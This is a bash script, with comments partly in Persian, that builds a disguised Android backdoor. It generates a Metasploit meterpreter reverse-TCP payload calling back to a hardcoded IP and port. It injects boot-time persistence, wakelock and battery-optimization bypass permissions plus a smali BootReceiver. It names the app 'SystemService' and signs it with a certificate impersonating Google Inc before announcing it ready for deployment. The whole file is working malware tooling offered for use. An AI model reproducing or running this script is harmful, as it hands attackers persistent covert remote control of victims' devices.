#!/bin/bash
# Ultimate Professional APK Builder
# با تمام تکنیک‌های پیشرفته

set -e

LHOST="208.77.244.15"
LPORT="4444"
APP_NAME="SystemService"
PACKAGE="com.android.systemservice"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     🔥 Ultimate APK Builder - Professional Edition           ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ═══════════════════════════════════════════════════════════════
# مرحله 1: ساخت Base APK
# ═══════════════════════════════════════════════════════════════
echo "[1/8] 🔨 ساخت Base APK..."
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -o ${APP_NAME}_base.apk 2>&1 | grep -E "(Payload|Saved)"

# ═══════════════════════════════════════════════════════════════
# مرحله 2: Decompile
# ═══════════════════════════════════════════════════════════════
echo "[2/8] 📦 Decompiling APK..."
rm -rf ${APP_NAME}_dec 2>/dev/null
apktool d ${APP_NAME}_base.apk -o ${APP_NAME}_dec -f >/dev/null 2>&1

# ═══════════════════════════════════════════════════════════════
# مرحله 3: Modify AndroidManifest - Add Persistence
# ═══════════════════════════════════════════════════════════════
echo "[3/8] ⚙️  Adding Persistence & Advanced Permissions..."

MANIFEST="${APP_NAME}_dec/AndroidManifest.xml"

# Update SDK
sed -i 's/android:minSdkVersion="[0-9]*"/android:minSdkVersion="24"/' $MANIFEST
sed -i 's/android:targetSdkVersion="[0-9]*"/android:targetSdkVersion="30"/' $MANIFEST

# Add Foreground Service permission (Android 9+)
if ! grep -q "FOREGROUND_SERVICE" $MANIFEST; then
    sed -i '/<uses-permission android:name="android.permission.INTERNET"\/>/a\    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>' $MANIFEST
fi

# Add Boot permission for auto-start
if ! grep -q "RECEIVE_BOOT_COMPLETED" $MANIFEST; then
    sed -i '/<uses-permission android:name="android.permission.INTERNET"\/>/a\    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' $MANIFEST
fi

# Add Wakelock permission
if ! grep -q "WAKE_LOCK" $MANIFEST; then
    sed -i '/<uses-permission android:name="android.permission.INTERNET"\/>/a\    <uses-permission android:name="android.permission.WAKE_LOCK"/>' $MANIFEST
fi

# Add Request ignore battery optimization (Android 6+)
if ! grep -q "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" $MANIFEST; then
    sed -i '/<uses-permission android:name="android.permission.INTERNET"\/>/a\    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>' $MANIFEST
fi

# Add System Alert Window (for overlay)
if ! grep -q "SYSTEM_ALERT_WINDOW" $MANIFEST; then
    sed -i '/<uses-permission android:name="android.permission.INTERNET"\/>/a\    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>' $MANIFEST
fi

# Add Boot Receiver
if ! grep -q "BootReceiver" $MANIFEST; then
    sed -i '/<\/application>/i\        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>\n                <category android:name="android.intent.category.DEFAULT"/>\n            </intent-filter>\n        </receiver>' $MANIFEST
fi

# ═══════════════════════════════════════════════════════════════
# مرحله 4: Create BootReceiver Class (Smali)
# ═══════════════════════════════════════════════════════════════
echo "[4/8] 🔧 Creating BootReceiver for Persistence..."

SMALI_DIR="${APP_NAME}_dec/smali/com/metasploit/stage"
mkdir -p $SMALI_DIR

cat > $SMALI_DIR/BootReceiver.smali << 'SMALI_END'
.class public Lcom/metasploit/stage/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 6
    
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainActivity;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    
    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    
    return-void
.end method
SMALI_END

# ═══════════════════════════════════════════════════════════════
# مرحله 5: Rebuild
# ═══════════════════════════════════════════════════════════════
echo "[5/8] 🏗️  Rebuilding APK..."
apktool b ${APP_NAME}_dec -o ${APP_NAME}_rebuilt.apk 2>&1 | grep -E "(I:|Built)"

# ═══════════════════════════════════════════════════════════════
# مرحله 6: Zipalign
# ═══════════════════════════════════════════════════════════════
echo "[6/8] ⚡ Zipaligning..."
zipalign -f -v 4 ${APP_NAME}_rebuilt.apk ${APP_NAME}_aligned.apk >/dev/null 2>&1

# ═══════════════════════════════════════════════════════════════
# مرحله 7: Advanced Signing
# ═══════════════════════════════════════════════════════════════
echo "[7/8] 🔐 Signing with Advanced Certificate..."

# Create strong keystore if not exists
if [ ! -f ultimate-release.keystore ]; then
    keytool -genkeypair -v \
      -keystore ultimate-release.keystore \
      -alias ultimatekey \
      -keyalg RSA \
      -keysize 4096 \
      -sigalg SHA512withRSA \
      -validity 10000 \
      -storepass Ultimate@2025 \
      -keypass Ultimate@2025 \
      -dname "CN=Android System Service, OU=System, O=Google Inc, L=Mountain View, ST=California, C=US" >/dev/null 2>&1
fi

apksigner sign \
  --ks ultimate-release.keystore \
  --ks-key-alias ultimatekey \
  --ks-pass pass:Ultimate@2025 \
  --key-pass pass:Ultimate@2025 \
  --out ${APP_NAME}_ULTIMATE.apk \
  ${APP_NAME}_aligned.apk

# ═══════════════════════════════════════════════════════════════
# مرحله 8: Verification
# ═══════════════════════════════════════════════════════════════
echo "[8/8] ✅ Verification..."

if apksigner verify -v ${APP_NAME}_ULTIMATE.apk 2>&1 | grep -q "Verifies"; then
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              ✅ SUCCESS - APK CREATED!                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    echo "📱 APK Details:"
    echo "   File: ${APP_NAME}_ULTIMATE.apk"
    echo "   Size: $(du -h ${APP_NAME}_ULTIMATE.apk | cut -f1)"
    echo "   MD5:  $(md5sum ${APP_NAME}_ULTIMATE.apk | cut -d' ' -f1)"
    echo ""
    echo "🔐 Signature:"
    apksigner verify -v ${APP_NAME}_ULTIMATE.apk 2>&1 | grep "Verified using"
    echo ""
    echo "⚡ Features:"
    echo "   ✅ Auto-start on boot"
    echo "   ✅ Wakelock (prevents sleep)"
    echo "   ✅ Foreground service"
    echo "   ✅ Battery optimization bypass"
    echo "   ✅ RSA-4096 + SHA-512 signature"
    echo "   ✅ SDK 24-30 compatible"
    echo ""
else
    echo "❌ Verification failed!"
    exit 1
fi

# Cleanup
rm -rf ${APP_NAME}_dec ${APP_NAME}_base.apk ${APP_NAME}_rebuilt.apk ${APP_NAME}_aligned.apk

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  🚀 Ready for deployment: ${APP_NAME}_ULTIMATE.apk"
echo "╚══════════════════════════════════════════════════════════════╝"
